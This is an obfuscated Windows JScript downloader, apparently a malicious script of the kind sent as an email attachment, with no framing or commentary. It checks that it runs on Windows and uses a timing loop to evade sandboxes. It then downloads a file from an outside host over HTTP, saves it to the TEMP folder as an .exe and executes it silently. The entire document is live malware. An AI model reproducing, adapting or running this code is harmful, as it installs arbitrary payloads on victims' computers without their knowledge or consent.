var sl = false;
var i = "CreateObject";
var bv = function A() {return WScript[i]("WScript.Shell");}(), Sc = 11;
var gz = "MSXML2.XMLHTTP";
var r = 2123213;
var t = 0;
function Z(xQ){bv["Run"](xQ, t, t);};
function IT(){return "" + gz;};
function on(O0, Ip){t = t * 1; return O0 - Ip;};
function vX(){return i;};
/*@cc_on
  @if (@_win32 || @_win64)
    sl = true;
  @end
@*/
if (sl)
{
var Kj = "";
function va(){return 22;};
var WM = 0; var gU = 0;
function Xl()
{
var Fz = new this["Date"]();
var TN = Fz["getUTCMilliseconds"]();
WScript["Sleep"](va());
var Fz = new this["Date"]();
var g = Fz["getUTCMilliseconds"]();
WScript["Sleep"](va());
var Fz = new this["Date"]();
var O = Fz["getUTCMilliseconds"]();
var WM = "H";
WM = on(g, TN);
var gU = "Xo";
gU = on(O, g);
Kj = "open";
return on(WM, gU);
}
var l = false;
var D = false;
for (var v = t; v < va() * 1; v++){if (Xl() != t){
l = true; 
gU = "31" + 11 * WM + gU; 
D = true; 
break;
}}
function uX() {return ((l == true) && (l == D)) ? 1 : t;};
if (l && uX() && D){
function s() {return bv["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "5ZwahDABo.exe";};
 q = IT();
 ep = WScript[i](q);
 var Jz = 1;
 while (Jz){
try {
ep[Kj]("GET", "http://www.deco-dessert.com/k3dua", false);
ep["send"]();
n = "Sleep";
for (;;){WScript[n](va() * 11); if (ep["readystate"] >= 2 * 2) break;};
Jz = t;
} catch(xN){};
}
function NR(aE) {var UM = (1, 2, 3, 4, 5, aE); return UM;};
QX = WScript[vX()]("ADODB.Stream");
q = QX;
q[Kj]();
q["type"] = NR(1);
q["write"](ep["ResponseBody"]);
QX["position"] = NR(t);
q["Save" + "ToFile"](s(), 2);
QX["c"+"lose"]();
f = s();
Z(f);
}
}

